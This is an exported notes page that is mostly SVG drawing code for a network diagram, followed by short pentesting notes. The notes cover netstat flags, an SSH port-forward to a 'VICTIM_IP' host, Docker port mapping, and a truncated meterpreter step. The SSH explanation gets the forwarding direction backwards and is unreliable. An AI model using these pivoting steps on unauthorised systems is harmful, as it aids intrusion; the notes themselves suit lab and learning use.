d="m952.68,362.54l3.2-.52v3.33h3.84v2.66h-3.84v3.97c0,.67.12,1.21.35,1.61.24.4.71.6,1.43.6.34,0,.7-.03,1.06-.1.36-.06.7-.15,1-.27l.45,2.49c-.39.16-.82.29-1.29.41-.47.11-1.05.17-1.74.17-.87,0-1.6-.12-2.17-.35s-1.03-.57-1.37-.99-.58-.93-.72-1.54c-.14-.6-.2-1.27-.2-2v-9.49Z" style="fill: #a3ea2a;"/>    <path d="m961.35,371.08c0-1,.15-1.88.46-2.63.31-.75.71-1.38,1.21-1.88s1.08-.88,1.73-1.14,1.32-.39,2.01-.39c1.6,0,2.87.49,3.8,1.47s1.4,2.42,1.4,4.33c0,.19,0,.39-.02.61s-.03.42-.04.59h-7.26c.07.66.38,1.18.92,1.57.54.39,1.27.58,2.19.58.59,0,1.16-.05,1.73-.16s1.03-.24,1.38-.4l.43,2.6c-.17.09-.4.17-.69.26s-.6.16-.96.23c-.35.06-.73.12-1.13.16-.4.04-.8.06-1.2.06-1.02,0-1.9-.15-2.65-.45-.75-.3-1.37-.71-1.87-1.23-.49-.52-.86-1.14-1.1-1.86-.24-.71-.35-1.49-.35-2.32Zm7.51-1.22c-.01-.27-.06-.54-.14-.79-.08-.26-.2-.49-.36-.69-.17-.2-.37-.37-.62-.49s-.56-.19-.93-.19-.67.06-.92.18c-.26.12-.47.28-.64.48s-.3.43-.4.7c-.09.27-.16.53-.2.81h4.23Z" style="fill: #a3ea2a;"/>    <path d="m981.23,368.19c-.29-.07-.62-.15-1.01-.23-.39-.08-.8-.12-1.25-.12-.2,0-.44.02-.72.05-.28.04-.49.08-.63.12v8.63h-3.2v-10.69c.57-.2,1.25-.39,2.03-.57.78-.18,1.65-.27,2.61-.27.17,0,.38.01.62.03.24.02.49.05.73.09.24.04.49.08.73.13.24.05.45.11.62.18l-.54,2.64Z" style="fill: #a3ea2a;"/>    <path d="m983.49,365.74c.54-.16,1.25-.3,2.1-.44.86-.14,1.76-.2,2.71-.2s1.76.13,2.39.38c.64.25,1.14.6,1.51,1.06.37.46.64,1,.79,1.63s.24,1.33.24,2.1v6.38h-3.2v-5.99c0-1.03-.14-1.76-.41-2.19-.27-.43-.78-.64-1.52-.64-.23,0-.47.01-.73.03s-.49.05-.69.08v8.72h-3.2v-10.91Z" style="fill: #a3ea2a;"/>    <path d="m995.6,371.08c0-1,.15-1.88.46-2.63.31-.75.71-1.38,1.21-1.88s1.08-.88,1.73-1.14c.65-.26,1.32-.39,2.01-.39,1.6,0,2.87.49,3.8,1.47.93.98,1.4,2.42,1.4,4.33,0,.19,0,.39-.02.61-.01.22-.03.42-.04.59h-7.26c.07.66.38,1.18.92,1.57s1.27.58,2.19.58c.59,0,1.16-.05,1.73-.16s1.03-.24,1.38-.4l.43,2.6c-.17.09-.4.17-.69.26-.29.09-.61.16-.96.23s-.73.12-1.13.16-.8.06-1.2.06c-1.02,0-1.9-.15-2.65-.45-.75-.3-1.37-.71-1.87-1.23s-.86-1.14-1.09-1.86c-.24-.71-.35-1.49-.35-2.32Zm7.51-1.22c-.01-.27-.06-.54-.14-.79-.08-.26-.2-.49-.37-.69s-.37-.37-.62-.49c-.25-.13-.56-.19-.93-.19s-.67.06-.92.18c-.26.12-.47.28-.64.48s-.3.43-.4.7c-.09.27-.16.53-.2.81h4.23Z" style="fill: #a3ea2a;"/>    <path d="m1008.57,362.54l3.2-.52v3.33h3.84v2.66h-3.84v3.97c0,.67.12,1.21.35,1.61.24.4.71.6,1.43.6.34,0,.7-.03,1.06-.1s.7-.15,1-.27l.45,2.49c-.39.16-.82.29-1.29.41s-1.05.17-1.74.17c-.87,0-1.6-.12-2.17-.35-.57-.24-1.03-.57-1.37-.99-.34-.42-.58-.93-.72-1.54-.14-.6-.2-1.27-.2-2v-9.49Z" style="fill: #a3ea2a;"/>  </g>  <rect x="53.49" y="606.72" width="73.31" height="73.31" style="fill: #727c92;"/>  <rect x="142.4" y="718.91" width="148.9" height="37.96" rx="5.76" ry="5.76" style="fill: #223654;"/>  <g>    <path d="m163.31,744.61c-.96-1.7-2-3.38-3.11-5.04-1.12-1.66-2.3-3.23-3.56-4.7v9.75h-3.31v-14.88h2.73c.47.47.99,1.05,1.57,1.74.57.69,1.16,1.42,1.75,2.2.59.78,1.18,1.59,1.77,2.43.59.84,1.14,1.64,1.65,2.42v-8.78h3.33v14.88h-2.81Z" style="fill: #a3ea2a;"/>    <path d="m168.81,739.05c0-1,.15-1.88.46-2.63.31-.75.71-1.38,1.21-1.88s1.08-.88,1.73-1.14c.65-.26,1.32-.39,2.01-.39,1.6,0,2.87.49,3.8,1.47.93.98,1.4,2.42,1.4,4.33,0,.19,0,.39-.02.61-.01.22-.03.42-.04.59h-7.26c.07.66.38,1.18.92,1.57.54.39,1.27.58,2.19.58.59,0,1.16-.05,1.73-.16s1.03-.24,1.38-.4l.43,2.6c-.17.09-.4.17-.69.26-.29.09-.6.16-.96.23-.35.06-.73.12-1.13.16-.4.04-.8.06-1.2.06-1.02,0-1.9-.15-2.65-.45s-1.37-.71-1.87-1.23c-.49-.52-.86-1.14-1.1-1.86-.24-.71-.35-1.49-.35-2.32Zm7.51-1.22c-.01-.27-.06-.54-.14-.79s-.2-.49-.36-.69c-.16-.2-.37-.37-.62-.49-.25-.13-.56-.19-.93-.19s-.67.06-.92.18c-.26.12-.47.28-.64.48s-.3.43-.4.7c-.09.27-.16.53-.2.81h4.23Z" style="fill: #a3ea2a;"/>    <path d="m181.78,730.5l3.2-.52v3.33h3.84v2.66h-3.84v3.97c0,.67.12,1.21.35,1.61.24.4.71.6,1.43.6.34,0,.7-.03,1.06-.1.36-.06.7-.15,1-.27l.45,2.49c-.39.16-.82.29-1.29.41-.47.11-1.05.17-1.74.17-.87,0-1.6-.12-2.17-.35-.57-.24-1.03-.57-1.37-.99-.34-.42-.58-.93-.72-1.54-.14-.6-.2-1.27-.2-2v-9.49Z" style="fill: #a3ea2a;"/>    <path d="m198.51,738.13c-.29,1.09-.59,2.17-.91,3.24-.32,1.07-.66,2.15-1.02,3.24h-2.49c-.26-.6-.54-1.32-.84-2.15-.3-.83-.61-1.74-.94-2.72-.32-.98-.65-2.02-.99-3.11-.34-1.1-.66-2.2-.98-3.32h3.37c.12.52.24,1.08.38,1.69.14.61.28,1.23.43,1.88.15.64.31,1.29.48,1.94s.33,1.28.51,1.88c.19-.63.37-1.27.55-1.93.18-.66.35-1.31.52-1.94.16-.64.32-1.25.47-1.85.15-.59.28-1.15.4-1.66h2.32c.11.52.24,1.07.39,1.66s.29,1.21.45,1.85c.16.64.32,1.29.49,1.94.17.66.35,1.3.54,1.93.17-.6.35-1.23.52-1.88.17-.65.33-1.3.49-1.94.15-.64.29-1.27.43-1.88s.26-1.17.38-1.69h3.33c-.32,1.12-.64,2.22-.98,3.32-.34,1.09-.67,2.13-.99,3.11-.32.98-.64,1.89-.95,2.72s-.59,1.54-.85,2.15h-2.49c-.36-1.09-.71-2.17-1.05-3.24-.34-1.07-.66-2.15-.94-3.24Z" style="fill: #a3ea2a;"/>    <path d="m218.77,738.94c0,.89-.13,1.7-.39,2.44-.26.74-.63,1.37-1.12,1.89-.49.52-1.07.93-1.75,1.21-.68.29-1.44.43-2.29.43s-1.59-.14-2.27-.43c-.68-.29-1.26-.69-1.75-1.21-.49-.52-.87-1.15-1.14-1.89-.27-.74-.41-1.55-.41-2.44s.14-1.7.42-2.43c.28-.73.67-1.35,1.16-1.87.49-.52,1.08-.92,1.76-1.2.68-.29,1.42-.43,2.22-.43s1.56.14,2.24.43c.68.29,1.26.69,1.75,1.2.49.52.87,1.14,1.14,1.87.27.73.41,1.54.41,2.43Zm-3.26,0c0-.99-.2-1.76-.59-2.33-.39-.57-.96-.85-1.69-.85s-1.3.28-1.7.85-.6,1.34-.6,2.33.2,1.77.6,2.35c.4.58.97.87,1.7.87s1.29-.29,1.69-.87c.39-.58.59-1.36.59-2.35Z" style="fill: #a3ea2a;"/>    <path d="m228.04,736.15c-.29-.07-.62-.15-1.01-.23-.39-.08-.8-.12-1.25-.12-.2,0-.44.02-.72.05-.28.04-.49.08-.63.12v8.63h-3.2v-10.69c.57-.2,1.25-.39,2.03-.57.78-.18,1.65-.27,2.61-.27.17,0,.38.01.62.03.24.02.49.05.73.09.24.04.49.08.73.13.24.05.45.11.62.18l-.54,2.64Z" style="fill: #a3ea2a;"/>    <path d="m233.5,737.37c.31-.34.64-.7.98-1.07s.66-.74.98-1.1c.31-.36.61-.71.89-1.04s.52-.61.72-.85h3.8c-.76.87-1.5,1.7-2.22,2.5-.72.79-1.51,1.61-2.37,2.45.43.39.87.85,1.33,1.39.46.54.9,1.09,1.33,1.67.43.57.82,1.15,1.18,1.72.36.57.66,1.1.9,1.57h-3.68c-.23-.37-.49-.79-.78-1.24-.29-.45-.6-.9-.93-1.36-.33-.45-.67-.89-1.04-1.3s-.73-.77-1.08-1.05v4.95h-3.2v-16.15l3.2-.51v9.42Z" style="fill: #a3ea2a;"/>    <path d="m253.37,733.38h2.49l.7-3.65h2.79l-.7,3.65h1.56v2.47h-2.03l-.51,2.64h2.54v2.47h-3.01l-.7,3.65h-2.79l.7-3.65h-2.49l-.7,3.65h-2.79l.7-3.65h-1.56v-2.47h2.03l.51-2.64h-2.54v-2.47h3.01l.7-3.65h2.79l-.7,3.65Zm-.98,5.11h2.49l.51-2.64h-2.49l-.51,2.64Z" style="fill: #a3ea2a;"/>    <path d="m272.04,733.64c0,.54-.11,1.07-.32,1.57-.21.5-.49.98-.84,1.45-.34.46-.73.91-1.16,1.34-.43.43-.85.84-1.27,1.22-.21.2-.45.43-.7.68-.25.25-.49.5-.72.76s-.43.5-.61.72c-.18.22-.29.41-.33.55h6.4v2.68h-9.92c-.03-.16-.04-.36-.04-.6v-.51c0-.69.11-1.32.33-1.89.22-.57.51-1.11.87-1.6.36-.49.76-.96,1.21-1.38s.9-.86,1.34-1.29c.34-.33.67-.64.97-.93.3-.29.56-.58.79-.86.23-.28.41-.56.54-.84s.19-.56.19-.85c0-.63-.18-1.07-.54-1.33-.36-.26-.8-.39-1.33-.39-.39,0-.75.06-1.08.18-.34.12-.64.26-.92.43-.28.17-.52.33-.72.49-.2.17-.35.3-.45.4l-1.59-2.23c.63-.59,1.36-1.07,2.2-1.45.84-.38,1.74-.57,2.69-.57.87,0,1.62.1,2.25.3.63.2,1.15.48,1.56.85.41.37.71.81.9,1.33.19.52.29,1.11.29,1.77Z" style="fill: #a3ea2a;"/>  </g>  <rect x="53.49" y="701.24" width="73.31" height="73.31" style="fill: #02adef;"/>  <line x1="548.77" y1="285.16" x2="1568.45" y2="285.16" style="fill: none; stroke: #a3ea2a; stroke-miterlimit: 10; stroke-width: 5px;"/>  <g id="Desktop_variation-3" data-name="Desktop variation">    <g>      <g id="Desktop_Computer-3" data-name="Desktop Computer">        <g>          <path d="m1594.16,259.26v57.55c0,1.92-1.33,3.58-3.2,4l-7.95,1.79-16.06,3.62c.5-.16,1.99-.96,2.03-5.01.02-2.17-.24-17.33-.53-33.5-.3-16.6-.64-34.26-.75-39.96-.02-.78-.24-1.54-.65-2.19-.35-.56-.83-1.05-1.42-1.41-.09-.05-.17-.1-.26-.15-.31-.17-.64-.32-.98-.41l.74-.03,2.39-.1c2.22-.09,4.42.45,6.33,1.57l18.27,10.67c1.26.74,2.03,2.09,2.03,3.54Z" style="fill: #525a6a;"/>          <path d="m1582.99,322.61l-16.06,3.62c.5-.16,1.99-.96,2.03-5.01.02-2.17-.24-17.33-.53-33.5.96,5.01,6.06,29.64,14.57,34.89Z" style="fill: #525a6a;"/>          <path d="m1594.16,259.26v4.4c-3.65-7.87-20.19-16.68-22.8-17.24-1.75-.37-3.35-.67-4.31-.84-.59-.11-.94-.17-.94-.17l-.74-1.4-.54-.87,2.2.07c2.56.08,5.06.8,7.26,2.09l17.84,10.42c1.26.74,2.03,2.09,2.03,3.54Z" style="fill: #525a6a;"/>          <path d="m1566.93,326.22c-.1.03-.16.04-.16.04l.16-.04Z" style="fill: #2c2c2c;"/>          <path d="m1540.08,245.12l24.15-1.9c2.01-.16,3.73,1.3,3.76,3.16l.97,76.93c.02,1.87-1.68,3.36-3.69,3.24l-25.11-1.53c-1.82-.11-3.24-1.51-3.24-3.21v-73.5c0-1.67,1.38-3.06,3.17-3.2Z" style="fill: #89bd27;"/>          <path d="m1567.53,322.49c.02,1.84-1.58,3.32-3.49,3.2l-23.74-1.51c-1.72-.11-3.07-1.49-3.07-3.16v-72.53c0-1.65,1.31-3.02,3.01-3.16l6.01-.49,16.86-1.38c1.9-.16,3.54,1.28,3.56,3.12l.33,34.13.49,38.71.04,3.07Z" style="fill: #727c92;"/>          <path d="m1567.53,322.44c.02,1.84-1.58,3.32-3.49,3.2l-23.74-1.51c-1.72-.11-3.07-1.49-3.07-3.16v-72.44c0-1.64,1.31-3.02,3-3.16l6-.49,21.25,74.49.04,3.06Z" style="fill: #525a6a; opacity: .65;"/>          <path d="m1538.22,249.26v4.27c0,.55.49.99,1.06.95l25.01-1.76c.52-.04.91-.45.91-.95v-4.71c0-.56-.5-1-1.08-.95l-25.01,2.2c-.51.04-.9.46-.9.95Z" style="fill: #d4d8df;"/>          <path d="m1538.22,257.81v4.27c0,.55.48.98,1.04.95l25.01-1.32c.52-.03.93-.45.93-.95v-4.71c0-.55-.49-.99-1.06-.95l-25.01,1.76c-.52.04-.91.45-.91.95Z" style="fill: #d4d8df;"/>          <path d="m1538.22,266.37v4.27c0,.54.46.97,1.02.95l25.01-.88c.53-.02.95-.44.95-.95v-4.71c0-.55-.48-.98-1.04-.95l-25.01,1.32c-.52.03-.93.45-.93.95Z" style="fill: #d4d8df;"/>          <polygon points="1560.96 287.92 1560.96 289.23 1542.96 289.23 1542.96 279.74 1543.62 279.73 1543.62 287.92 1560.96 287.92" style="fill: #1c2538;"/>          <polygon points="1560.96 279.29 1560.96 287.92 1543.62 287.92 1543.62 279.75 1560.96 279.29" style="fill: #d4d8df;"/>          <polyline points="1545.91 316.22 1545.91 317.69 1548.69 317.69 1548.69 316.22 1545.91 316.22" style="fill: #d4d8df;"/>          <polyline points="1552.61 316.38 1552.61 317.85 1555.89 317.85 1555.89 316.38 1552.61 316.38" style="fill: #d4d8df;"/>          <polygon points="1560.96 283.94 1543.78 284.08 1543.78 284.93 1560.96 284.93 1560.96 283.94" style="fill: #1c2538;"/>          <path d="m1567.51,322.45c.02,1.84-1.58,3.31-3.48,3.2l-23.72-1.51c-1.72-.11-3.06-1.49-3.06-3.16v-33.48c.46,5.44.05,29.13,3.99,33.32,3.19,3.4,17.46,3.27,21.97,2.24,4.44-1.02,3.66-29.42,3.8-42.31l.5,41.69Z" style="fill: #1c2538;"/>          <polygon points="1591.21 264.68 1591.42 315.99 1589.74 316.39 1589.33 263.47 1591.21 264.68" style="fill: #727c92; opacity: .65;"/>          <path d="m1541.25,320.85l-2.98,2.01-.3.14s.38.73,1.55,1.06l2.75-2.38s-.93-.6-1.02-.81Z" style="fill: #e8e8e8; opacity: .26;"/>          <path d="m1537.82,323.85s1.96,1.06,2.91,1.13l22.47,1.45c1.02.07,2.11-.1,2.97-.65l1.75-1.52-.09-.02-1.41.9c-1.13.72-2.53.97-3.87.89l-21.59-1.31c-1-.06-3.15-.86-3.15-.86h0Z" style="fill: #64930a;"/>          <path d="m1541,323.06s4.88,1.34,11.05,1.52c6.17.18,11.81-.4,13.38-.85,0,0-9.98.62-13.38.49-3.4-.13-11.28-1.25-11.28-1.25" style="fill: #e8e8e8; opacity: .26;"/>          <path d="m1566.06,243.98s1.09.91,1.09,2.09c0,1.18.36,27.56.36,27.56,0,0,.81-25.58.5-27.3-.32-1.73-1.95-2.35-1.95-2.35Z" style="fill: #a3ea2a; opacity: .36;"/>        </g>      </g>      <rect x="1587.81" y="314.7" width="14.14" height="11.39" style="fill: url(#linear-gradient-17);"/>      <rect x="1554" y="270.59" width="81.76" height="49.13" rx="1.38" ry="1.38" style="fill: url(#linear-gradient-18);"/>      <path d="m1635.76,271.97v42.41h-81.76v-42.41c0-.76.62-1.38,1.38-1.38h79.01c.76,0,1.38.62,1.38,1.38Z" style="fill: url(#linear-gradient-19);"/>      <path d="m1582.54,325.04h24.68v1.05c0,.6-.49,1.08-1.08,1.08h-22.51c-.6,0-1.08-.49-1.08-1.08v-1.05h0Z" transform="translate(3189.76 652.22) rotate(180)" style="fill: url(#linear-gradient-20);"/>      <circle cx="1594.88" cy="317.64" r="1.41" style="fill: #1c2538;"/>      <path d="m1557.02,311v-37.14c0-.5.4-.9.9-.9h73.92c.5,0,.9.4.9.9v37.14c0,.68-.57,1.23-1.28,1.23h-73.17c-.71,0-1.28-.55-1.28-1.23Z" style="fill: url(#linear-gradient-21);"/>      <rect x="1568.43" y="280.65" width="36.62" height="1.18" style="fill: #a3ea2a;"/>      <rect x="1568.45" y="283.66" width="47.44" height="1.18" style="fill: #a3ea2a;"/>      <rect x="1568.45" y="286.66" width="51.72" height="1.18" style="fill: #a3ea2a;"/>      <rect x="1568.43" y="293.49" width="36.62" height="1.18" style="fill: #a3ea2a;"/>      <rect x="1568.45" y="296.5" width="47.44" height="1.18" style="fill: #a3ea2a;"/>      <rect x="1568.45" y="299.5" width="51.72" height="1.18" style="fill: #a3ea2a;"/>    </g>  </g>  <g id="Router">    <g>      <path d="m585.36,292.52c-.01,14.24-19.43,25.8-43.36,25.82-23.94.02-43.33-11.51-43.32-25.75v-14.8s86.7-.08,86.7-.08c0,0,0,6.19-.01,14.8Z" style="fill: url(#linear-gradient-22);"/>      <ellipse cx="542.03" cy="277.76" rx="43.34" ry="25.78" transform="translate(-.51 .99) rotate(-.1)" style="fill: url(#linear-gradient-23);"/>      <polygon points="532.49 274.48 517.82 274.49 517.82 270.2 506.12 276.94 517.81 283.66 517.81 279.36 532.48 279.35 532.49 274.48" style="fill: url(#linear-gradient-24);"/>      <polygon points="551.57 279.34 566.24 279.32 566.23 283.62 577.93 276.88 566.24 270.16 566.24 274.45 551.57 274.47 551.57 279.34" style="fill: url(#linear-gradient-25);"/>      <polygon points="539.58 280.53 539.57 289.9 539.57 290.88 535.26 290.89 542 302.53 548.77 290.88 544.46 290.88 544.46 289.9 544.47 280.53 539.58 280.53" style="fill: url(#linear-gradient-26);"/>      <polygon points="544.07 273.28 544.08 263.52 544.08 262.7 547.67 262.69 542.05 252.99 536.41 262.7 540 262.7 540 263.52 539.99 273.29 544.07 273.28" style="fill: url(#linear-gradient-27);"/>    </g>  </g>  <g id="Router-2" data-name="Router">    <g>      <path d="m1342.3,292.52c-.01,14.24-19.43,25.8-43.36,25.82-23.94.02-43.33-11.51-43.32-25.75v-14.8s86.7-.08,86.7-.08c0,0,0,6.19-.01,14.8Z" style="fill: url(#linear-gradient-28);"/>      <ellipse cx="1298.97" cy="277.76" rx="43.34" ry="25.78" transform="translate(-.51 2.38) rotate(-.1)" style="fill: url(#linear-gradient-29);"/>      <polygon points="1289.43 274.48 1274.76 274.49 1274.77 270.2 1263.07 276.94 1274.76 283.66 1274.76 279.36 1289.43 279.35 1289.43 274.48" style="fill: url(#linear-gradient-30);"/>      <polygon points="1308.51 279.34 1323.18 279.32 1323.18 283.62 1334.88 276.88 1323.19 270.16 1323.18 274.45 1308.52 274.47 1308.51 279.34" style="fill: url(#linear-gradient-31);"/>      <polygon points="1296.52 280.53 1296.52 289.9 1296.52 290.88 1292.2 290.89 1298.95 302.53 1305.72 290.88 1301.4 290.88 1301.41 289.9 1301.41 280.53 1296.52 280.53" style="fill: url(#linear-gradient-32);"/>      <polygon points="1301.01 273.28 1301.02 263.52 1301.02 262.7 1304.61 262.69 1298.99 252.99 1293.35 262.7 1296.95 262.7 1296.95 263.52 1296.94 273.29 1301.01 273.28" style="fill: url(#linear-gradient-33);"/>    </g>  </g>  <g id="Cloud_internet" data-name="Cloud + internet">    <g>      <g>        <g>          <path d="m985.38,267.5l-2.59.6c-1.47-17.01-15.74-30.36-33.14-30.36s-31.87,13.53-33.17,30.71c-.25,0-.51-.01-.76-.01-11.65,0-21.19,9-22.06,20.42l-3.28.76c-8.93,0-16.17,7.24-16.17,16.17s7.28,17.01,16.17,16.17c30.43-2.87,83.81-8.76,95-10.22,12.12-1.57,22.13-9.91,22.13-22.13s-9.91-22.13-22.13-22.13Z" style="fill: url(#linear-gradient-34);"/>          <path d="m875.54,306.39c0,8.93,7.28,17.01,16.17,16.17,30.43-2.87,83.81-8.76,95-10.22,12.12-1.57,22.13-9.91,22.13-22.13s-9.91-22.13-22.13-22.13l-2.59.6c-1.47-17.01-15.74-30.36-33.14-30.36s-31.87,13.53-33.17,30.71c-.25,0-.51-.01-.76-.01-11.65,0-21.19,9-22.06,20.42l-3.28.76c-8.93,0-16.17,7.24-16.17,16.17Z" style="fill: url(#linear-gradient-35);"/>          <path d="m876.88,306.99c0,8.93,7.28,17.01,16.17,16.17,30.43-2.87,83.81-8.76,95-10.22,12.12-1.57,22.13-9.91,22.13-22.13s-9.91-22.13-22.13-22.13l-2.59.6c-1.47-17.01-15.74-30.36-33.14-30.36s-31.87,13.53-33.17,30.71c-.25,0-.51-.01-.76-.01-11.65,0-21.19,9-22.06,20.42l-3.28.76c-8.93,0-16.17,7.24-16.17,16.17Z" style="fill: url(#linear-gradient-36);"/>          <path d="m878.22,307.59c0,8.93,7.28,17.01,16.17,16.17,30.43-2.87,83.81-8.76,95-10.22,12.12-1.57,22.13-9.91,22.13-22.13s-9.91-22.13-22.13-22.13l-2.59.6c-1.47-17.01-15.74-30.36-33.14-30.36s-31.87,13.53-33.17,30.71c-.25,0-.51-.01-.76-.01-11.65,0-21.19,9-22.06,20.42l-3.28.76c-8.93,0-16.17,7.24-16.17,16.17Z" style="fill: url(#linear-gradient-37);"/>          <path d="m879.55,308.18c0,8.93,7.28,17.01,16.17,16.17,30.43-2.87,83.81-8.76,95-10.22,12.12-1.57,22.13-9.91,22.13-22.13s-9.91-22.13-22.13-22.13l-2.59.6c-1.47-17.01-15.74-30.36-33.14-30.36s-31.87,13.53-33.17,30.71c-.25,0-.51-.01-.76-.01-11.65,0-21.19,9-22.06,20.42l-3.28.76c-8.93,0-16.17,7.24-16.17,16.17Z" style="fill: url(#linear-gradient-38);"/>          <path d="m880.89,308.78c0,8.93,7.28,17.01,16.17,16.17,30.43-2.87,83.81-8.76,95-10.22,12.12-1.57,22.13-9.91,22.13-22.13s-9.91-22.13-22.13-22.13l-2.59.6c-1.47-17.01-15.74-30.36-33.14-30.36s-31.87,13.53-33.17,30.71c-.25,0-.51-.01-.76-.01-11.65,0-21.19,9-22.06,20.42l-3.28.76c-8.93,0-16.17,7.24-16.17,16.17Z" style="fill: url(#linear-gradient-39);"/>          <path d="m882.23,309.38c0,8.93,7.28,17.01,16.17,16.17,30.43-2.87,83.81-8.76,95-10.22,12.12-1.57,22.13-9.91,22.13-22.13s-9.91-22.13-22.13-22.13l-2.59.6c-1.47-17.01-15.74-30.36-33.14-30.36s-31.87,13.53-33.17,30.71c-.25,0-.51-.01-.76-.01-11.65,0-21.19,9-22.06,20.42l-3.28.76c-8.93,0-16.17,7.24-16.17,16.17Z" style="fill: url(#linear-gradient-40);"/>          <path d="m883.57,309.97c0,8.93,7.28,17.01,16.17,16.17,30.43-2.87,83.81-8.76,95-10.22,12.12-1.57,22.13-9.91,22.13-22.13s-9.91-22.13-22.13-22.13l-2.59.6c-1.47-17.01-15.74-30.36-33.14-30.36s-31.87,13.53-33.17,30.71c-.25,0-.51-.01-.76-.01-11.65,0-21.19,9-22.06,20.42l-3.28.76c-8.93,0-16.17,7.24-16.17,16.17Z" style="fill: url(#linear-gradient-41);"/>          <path d="m884.9,310.57c0,8.93,7.28,17.01,16.17,16.17,30.43-2.87,83.81-8.76,95-10.22,12.12-1.57,22.13-9.91,22.13-22.13s-9.91-22.13-22.13-22.13l-2.59.6c-1.47-17.01-15.74-30.36-33.14-30.36s-31.87,13.53-33.17,30.71c-.25,0-.51-.01-.76-.01-11.65,0-21.19,9-22.06,20.42l-3.28.76c-8.93,0-16.17,7.24-16.17,16.17Z" style="fill: url(#linear-gradient-42);"/>          <path d="m886.24,311.17c0,8.93,7.28,17.01,16.17,16.17,30.43-2.87,83.81-8.76,95-10.22,12.12-1.57,22.13-9.91,22.13-22.13s-9.91-22.13-22.13-22.13l-2.59.6c-1.47-17.01-15.74-30.36-33.14-30.36s-31.87,13.53-33.17,30.71c-.25,0-.51-.01-.76-.01-11.65,0-21.19,9-22.06,20.42l-3.28.76c-8.93,0-16.17,7.24-16.17,16.17Z" style="fill: url(#linear-gradient-43);"/>          <path d="m887.58,311.76c0,8.93,7.28,17.01,16.17,16.17,30.43-2.87,83.81-8.76,95-10.22,12.12-1.57,22.13-9.91,22.13-22.13s-9.91-22.13-22.13-22.13l-2.59.6c-1.47-17.01-15.74-30.36-33.14-30.36s-31.87,13.53-33.17,30.71c-.25,0-.51-.01-.76-.01-11.65,0-21.19,9-22.06,20.42l-3.28.76c-8.93,0-16.17,7.24-16.17,16.17Z" style="fill: url(#linear-gradient-44);"/>          <path d="m1000.09,274.06l-2.59.6c-1.47-17.01-15.74-30.36-33.14-30.36s-31.87,13.53-33.17,30.71c-.25,0-.51-.01-.76-.01-11.65,0-21.19,9-22.06,20.42l-3.28.76c-8.93,0-16.17,7.24-16.17,16.17s7.28,17.01,16.17,16.17c30.43-2.87,83.81-8.76,95-10.22,12.12-1.57,22.13-9.91,22.13-22.13s-9.91-22.13-22.13-22.13Z" style="fill: url(#linear-gradient-45);"/>        </g>        <path d="m1000.09,274.06l-2.59.6c-1.47-17.01-15.74-30.36-33.14-30.36s-31.87,13.53-33.17,30.71c-.25,0-.51-.01-.76-.01-11.65,0-21.19,9-22.06,20.42l-3.28.76c-8.93,0-16.17,7.24-16.17,16.17s7.28,17.01,16.17,16.17c30.43-2.87,83.81-8.76,95-10.22,12.12-1.57,22.13-9.91,22.13-22.13s-9.91-22.13-22.13-22.13Z" style="fill: url(#linear-gradient-46);"/>      </g>      <g id="Artwork_24" data-name="Artwork 24">        <path d="m961.62,277.03c-14.9.84-27.02,13.64-27.02,28.54s12.12,26.25,27.02,25.3,27.02-13.75,27.02-28.54-12.12-26.14-27.02-25.3Zm-24.7,29.53l8.61-.52c.08,3.11.46,6.06,1.12,8.77l-7.66.47c-1.21-2.65-1.92-5.6-2.06-8.72Zm25.83-15.09v-12.11c4.61.4,8.6,4.87,10.82,11.48l-10.82.63Zm11.48,1.58c.71,2.73,1.14,5.75,1.22,8.95l-12.71.76v-9.04l11.48-.67Zm-13.75-13.56v12.11l-10.82.63c2.23-6.89,6.21-11.81,10.82-12.74Zm0,14.36v9.04l-12.7.76c.08-3.22.51-6.3,1.22-9.13l11.48-.67Zm-14.96,9.93l-8.61.52c.14-3.23.9-6.33,2.17-9.19l7.62-.45c-.69,2.85-1.1,5.93-1.17,9.13Zm2.25,2.12l12.71-.76v8.82l-11.56.71c-.67-2.68-1.07-5.64-1.15-8.76Zm12.71,10.31v12.37c-4.68-.38-8.7-4.94-10.91-11.7l10.91-.67Zm2.26,12.23v-12.37l10.91-.67c-2.21,7.01-6.24,12.07-10.91,13.04Zm0-14.62v-8.82l12.71-.76c-.08,3.12-.47,6.12-1.15,8.87l-11.56.71Zm14.96-9.72l8.61-.52c-.14,3.12-.85,6.13-2.06,8.91l-7.66.47c.66-2.78,1.04-5.76,1.12-8.87Zm0-2.25c-.08-3.17-.49-6.19-1.17-8.95l7.62-.45c1.27,2.7,2.02,5.69,2.17,8.88l-8.61.52Zm5.27-11.57l-7.07.41c-1.44-4.48-3.64-8.14-6.32-10.54,5.67,1.6,10.42,5.24,13.4,10.13Zm-29.32-9.22c-2.69,2.71-4.89,6.64-6.32,11.3l-7.07.41c2.98-5.26,7.72-9.47,13.4-11.71Zm-13.53,36.4l7.13-.44c1.42,4.57,3.63,8.3,6.33,10.74-5.73-1.61-10.5-5.31-13.46-10.3Zm29.53,9.28c2.7-2.77,4.91-6.76,6.33-11.49l7.13-.44c-2.97,5.33-7.74,9.61-13.46,11.93Z" style="fill: url(#radial-gradient);"/>      </g>    </g>  </g></svg>


| Option         | Description                 |
| -------------- | --------------------------- |
| `netsat -tuln` | Basic use                   |
| `-t`           | [[TCP\|TCP]] connection          |
| `-u`           | [[UDP\|UDP]] connection          |
| `-l`           | Show port on listen mode    |
| `-n`           | Show numbers of active port |
# 
<div class="transclusion internal-embed is-loaded"><a class="markdown-embed-link" href="/notes/ssh/#port-forwarding" aria-label="Open link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a><div class="markdown-embed">



# Port forwarding
`4545` port from a victim machine which we don't have access will be available in our machine on `127.0.0.1:8888`
```shell
ssh user@"VICTIM_IP" -L 4545:127.0.0.1:8888
```


</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## Port forwarding
```shell
docker run -dit -p 80:80 --name name_of_new_container name_of_image

docker run -p 53:53/udp mi_imagen
```

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Execute this Inside the *meterpreter* on the *machine 2*
